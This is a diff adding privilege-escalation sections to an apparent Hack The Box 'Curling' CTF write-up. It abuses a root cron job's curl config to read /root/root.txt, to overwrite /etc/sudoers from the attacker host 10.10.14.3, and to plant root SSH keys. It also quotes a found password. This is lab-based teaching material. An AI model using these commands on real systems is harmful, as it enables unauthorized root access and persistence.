@@ -84,7 +84,60 @@ cat password.txt
 
 This provides us a password: ```5d<wdCbdZu)|hChXll```. We can now use ```su floris``` and enter the password to have access using the ```floris``` account.
 
-# Privilege Escalation
+# Privilege Escalation (Method 1)
+We now have access to the ```admin-area``` where we find two files named ```input``` and ```report```. There's probably a cron job running as root. We can confirm this by running the following command:
+```
+while true; do ps waux | grep report | grep -v "grep --color"; done
+```
+We could also use ```pspy64s``` for this.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/11.png">
+
+One way to get the root flag is to change the ```input``` file so that it uses ```curl``` to retrieve the root flag:
+
+```
+echo url = "file:///root/root.txt" > input
+```
+And then wait until the cron jobs runs.
+
+# Privilege Escalation (Method 2)
+Another way is to change the ```sudo``` configuration:
+```
+nano my-sudoers
+
+Add:
+root	ALL=(ALL:ALL) ALL
+floris	ALL=(ALL:ALL) ALL
+```
+And start a webserver on the attacking machine:
+```
+python -m SimpleHTTPServer 8000
+```
+We then change the content of the ```input``` file so that it downloads our sudoers file and saves it at ```/etc/sudoers```:
+```
+echo -e 'url = "http://10.10.14.3:8000/my-sudoers"\noutput = "/etc/sudoers"' > input
+```
+We can now run ```sudo su``` and enter our known password to get a shell as root:
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/12.png">
+
+# Privilege Escalation (Method 3)
+Yet another way is to copy our public ```ssh``` key to the authorized keys at our target. We'll first create a keypair using ```ssh-keygen``` and setup a webserver.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/13.png">
+
+We then change the content of the ```input``` file  
+```
+echo -e 'url = "http://10.10.14.3:8000/authorized_keys"\noutput = "/root/.ssh/authorized_keys"' > input
+```
+We again wait until the file is downloaded and are then able to login as ```root```:
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/14.png">
+
+
+
+
+
+
 
 
 
